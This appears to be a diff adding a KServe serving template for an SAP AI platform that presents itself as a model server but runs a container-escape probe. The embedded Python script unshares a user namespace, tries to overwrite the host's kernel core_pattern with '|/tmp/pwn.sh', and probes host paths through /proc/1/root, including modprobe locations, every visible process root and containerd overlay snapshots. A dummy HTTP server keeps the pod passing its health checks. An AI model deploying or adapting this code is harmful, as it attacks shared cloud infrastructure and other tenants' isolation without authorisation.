@@ -1,0 +1,233 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: cve31431-userns
+  labels:
+    scenarios.ai.sap.com/id: "cve31431-userns"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "cve31431-userns"
+    executables.ai.sap.com/name: "cve31431-userns"
+    executables.ai.sap.com/description: "user namespace + host path recon"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            cat > /tmp/probe.py << 'PYEOF'
+            import os, sys, socket, struct, subprocess, ctypes, ctypes.util, time
+
+            def r(k, v): print(f"[USERNS] {k}: {str(v)[:4000]}", flush=True)
+
+            r("PHASE", "1-USER-NAMESPACE")
+
+            # Test if unshare(CLONE_NEWUSER) is available
+            libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+            CLONE_NEWUSER = 0x10000000
+            CLONE_NEWNS   = 0x00020000
+            CLONE_NEWPID  = 0x20000000
+
+            # Check if unshare syscall is reachable at all
+            # syscall number for unshare on x86_64 = 272
+            libc.syscall.restype = ctypes.c_long
+            ret = libc.syscall(272, ctypes.c_int(CLONE_NEWUSER))
+            errno = ctypes.get_errno()
+            r("UNSHARE_NEWUSER_RET", str(ret))
+            r("UNSHARE_NEWUSER_ERRNO", str(errno))
+            r("UNSHARE_NEWUSER_WORKS", str(ret == 0))
+
+            if ret == 0:
+                r("UID_AFTER_USERNS", str(os.getuid()))
+                r("EUID_AFTER_USERNS", str(os.geteuid()))
+
+                # Write uid_map: map host uid 65534 -> namespace uid 0
+                try:
+                    with open("/proc/self/uid_map", "w") as f:
+                        f.write("0 65534 1")
+                    r("UID_MAP_WRITTEN", "yes")
+                except Exception as e:
+                    r("UID_MAP_ERR", str(e))
+
+                # Write setgroups = deny (required before gid_map)
+                try:
+                    with open("/proc/self/setgroups", "w") as f:
+                        f.write("deny")
+                except: pass
+
+                try:
+                    with open("/proc/self/gid_map", "w") as f:
+                        f.write("0 65534 1")
+                    r("GID_MAP_WRITTEN", "yes")
+                except Exception as e:
+                    r("GID_MAP_ERR", str(e))
+
+                r("UID_AFTER_MAP", str(os.getuid()))
+                r("EUID_AFTER_MAP", str(os.geteuid()))
+
+                # Check caps inside user namespace
+                try:
+                    caps = open("/proc/self/status").read()
+                    for line in caps.split("\n"):
+                        if line.startswith("Cap") or line.startswith("NoNewPrivs"):
+                            r(line.split(":")[0].strip(), line.split(":")[1].strip() if ":" in line else "")
+                except Exception as e:
+                    r("CAPS_ERR", str(e))
+
+                # Try to write core_pattern from user namespace root
+                try:
+                    with open("/proc/sys/kernel/core_pattern", "r") as f:
+                        cp = f.read().strip()
+                    r("CORE_PATTERN_CURRENT", cp)
+                    with open("/proc/sys/kernel/core_pattern", "w") as f:
+                        f.write("|/tmp/pwn.sh")
+                    r("CORE_PATTERN_WRITE", "SUCCESS")
+                    # Restore
+                    with open("/proc/sys/kernel/core_pattern", "w") as f:
+                        f.write(cp)
+                except Exception as e:
+                    r("CORE_PATTERN_WRITE_ERR", str(e))
+
+                # Try to mount from user namespace (need mount namespace too)
+                ret2 = libc.syscall(272, ctypes.c_int(CLONE_NEWNS))
+                r("UNSHARE_NEWNS_RET", str(ret2))
+                r("UNSHARE_NEWNS_ERRNO", str(ctypes.get_errno()))
+
+                # Try to mount proc
+                if ret2 == 0:
+                    try:
+                        os.makedirs("/tmp/newproc", exist_ok=True)
+                        ret3 = libc.mount(b"proc", b"/tmp/newproc", b"proc", 0, None)
+                        r("MOUNT_PROC_RET", str(ret3))
+                        r("MOUNT_PROC_ERRNO", str(ctypes.get_errno()))
+                        if ret3 == 0:
+                            # Read /proc/1/status from new proc mount
+                            pid1_status = open("/tmp/newproc/1/status").read()
+                            for line in pid1_status.split("\n"):
+                                if "NoNewPrivs" in line or line.startswith("Uid") or line.startswith("Name"):
+                                    r("NEWPROC_PID1_"+line.split(":")[0].strip(), line.split(":",1)[1].strip() if ":" in line else "")
+                    except Exception as e:
+                        r("MOUNT_PROC_ERR", str(e))
+
+            # ── PHASE 2: HOST PATH ACCESS VIA /proc/1/root ───────────────────
+            r("PHASE", "2-HOST-PATH-RECON")
+
+            # Check what's accessible via /proc/1/root (our PID 1)
+            try:
+                r("PROC_1_ROOT_SYMLINK", os.readlink("/proc/1/root"))
+            except Exception as e:
+                r("PROC_1_ROOT_ERR", str(e))
+
+            # Try host paths where modprobe would be
+            for path in ["/proc/1/root/sbin/modprobe",
+                         "/proc/1/root/sbin/kmod",
+                         "/proc/1/root/usr/sbin/modprobe",
+                         "/proc/1/root/bin/kmod"]:
+                try:
+                    st = os.stat(path)
+                    r(f"STAT_{path}", f"ino={st.st_ino} dev={hex(st.st_dev)} size={st.st_size}")
+                except Exception as e:
+                    r(f"STAT_{path}", f"ERR: {e}")
+
+            # Try to list /proc/1/root/sbin
+            try:
+                entries = os.listdir("/proc/1/root/sbin")
+                r("PROC_1_ROOT_SBIN", str(entries[:20]))
+            except Exception as e:
+                r("PROC_1_ROOT_SBIN_ERR", str(e))
+
+            # Try to list /proc/1/root/etc/modprobe.d
+            try:
+                mpd = os.listdir("/proc/1/root/etc/modprobe.d")
+                r("PROC_1_ROOT_MODPROBE_D", str(mpd))
+            except Exception as e:
+                r("PROC_1_ROOT_MODPROBE_D_ERR", str(e))
+
+            # Check all PIDs accessible
+            try:
+                all_pids = [p for p in os.listdir("/proc") if p.isdigit()]
+                r("ALL_VISIBLE_PIDS", str(sorted(int(p) for p in all_pids)))
+
+                # For each pid check /proc/<pid>/root vs /proc/1/root
+                for pid in all_pids:
+                    try:
+                        root_link = os.readlink(f"/proc/{pid}/root")
+                        exe_link = os.readlink(f"/proc/{pid}/exe")
+                        uid_line = [l for l in open(f"/proc/{pid}/status").read().split("\n") if l.startswith("Uid")]
+                        nnp_line = [l for l in open(f"/proc/{pid}/status").read().split("\n") if "NoNewPrivs" in l]
+                        r(f"PID_{pid}_ROOT", root_link)
+                        r(f"PID_{pid}_EXE", exe_link)
+                        r(f"PID_{pid}_UID", uid_line[0] if uid_line else "?")
+                        r(f"PID_{pid}_NNP", nnp_line[0] if nnp_line else "?")
+                        # Can we list their root?
+                        try:
+                            root_contents = os.listdir(f"/proc/{pid}/root")
+                            r(f"PID_{pid}_ROOT_CONTENTS", str(root_contents[:5]))
+                        except Exception as e2:
+                            r(f"PID_{pid}_ROOT_LIST_ERR", str(e2))
+                    except Exception as e:
+                        pass
+            except Exception as e:
+                r("PID_SCAN_ERR", str(e))
+
+            # ── PHASE 3: OVERLAY LOWER DIR RECON ─────────────────────────────
+            r("PHASE", "3-OVERLAY-LOWER-DIR")
+            # From the mount output, lower dirs are at:
+            # /var/lib/containerd/.../snapshots/162-168/fs
+            # Try to access these via /proc/1/root
+            for snap_id in range(158, 175):
+                path = f"/proc/1/root/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/{snap_id}/fs"
+                try:
+                    entries = os.listdir(path)
+                    r(f"SNAPSHOT_{snap_id}_EXISTS", str(entries[:5]))
+                except:
+                    pass
+
+            # Also try the host's /sbin via snapshot path
+            # Check if any snapshot has /sbin/modprobe
+            for snap_id in range(158, 175):
+                path = f"/proc/1/root/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/{snap_id}/fs/sbin/modprobe"
+                try:
+                    st = os.stat(path)
+                    r(f"MODPROBE_IN_SNAPSHOT_{snap_id}", f"ino={st.st_ino} size={st.st_size}")
+                except:
+                    pass
+
+            r("DONE", "all phases complete")
+            PYEOF
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 15
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 15
+            periodSeconds: 10
